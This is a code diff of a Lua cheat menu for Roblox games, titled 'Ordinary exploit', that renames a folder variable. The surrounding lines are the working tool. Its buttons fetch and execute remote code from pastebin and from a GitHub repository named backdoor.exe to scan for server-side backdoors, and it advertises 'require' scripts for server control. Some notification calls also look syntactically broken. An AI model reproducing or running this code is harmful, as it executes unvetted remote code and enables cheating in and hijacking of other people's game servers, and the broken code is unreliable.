@@ -4,7 +4,7 @@ local w = library:CreateWindow("Ordinary exploit")
 local GUI = w:CreateFolder("Destroy GUI")
 local q = w:CreateFolder("Гуманоидный эксплойт")
 local e = w:CreateFolder("Игровой эксплойт GUI")
-local r = w:CreateFolder("ServerSide")
+local d = w:CreateFolder("ServerSide")
 
 game.StarterGui:SetCore("SendNotification",{
     Title = "TNightmareHA A^X";
@@ -115,30 +115,30 @@ e:Button("Lumber Tycoon 2",function()
     loadstring(game:HttpGet("https://pastebin.com/raw/qzsLHpF9"))()
 end)
 
-r:Label("Scan Game",{
+d:Label("Scan Game",{
     TextSize = 25;
     TextColor = Color3.fromRGB(255,255,255);
     BgColor = Color3.fromRGB(69,69,69);
 })
 
-r:Button("Detect SS",function()
+d:Button("Detect SS",function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua",true))()
 end)
 
-r:Label("Require Скрипты",{
+d:Label("Require Скрипты",{
     TextSize = 25;
     TextColor = Color3.fromRGB(255,255,255);
     BgColor = Color3.fromRGB(69,69,69);
 })
 
-r:Button("Adrian Latest GUI",function()
+d:Button("Adrian Latest GUI",function()
     game.StarterGui:SetCore("SendNotification",{
     Title = "Master SS";
     Text = "The require сценарий has been copied to clipboard";
     Duration = 10;
 end)
         
-r:Button("Coming Soon",function()
+d:Button("Coming Soon",function()
     game.StarterGui:SetCore("SendNotification",{
     Title = "Master SS";
     Text = "More require scripts coming soon!";
